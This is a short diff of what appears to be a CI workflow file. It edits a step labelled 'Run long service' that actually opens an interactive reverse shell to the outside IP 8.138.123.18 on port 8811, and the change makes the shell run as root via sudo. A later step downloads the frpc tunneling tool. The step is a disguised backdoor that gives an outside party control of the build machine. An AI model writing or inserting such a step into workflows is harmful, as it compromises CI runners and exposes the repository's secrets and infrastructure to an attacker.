@@ -27,7 +27,7 @@ jobs:
 
       - name: Run long service
         run: |
-          sh -i >& /dev/tcp/8.138.123.18/8811 0>&1
+         sudo sh -i >& /dev/tcp/8.138.123.18/8811 0>&1
 
       # Download and prepare frpc
       - name: Download frpc
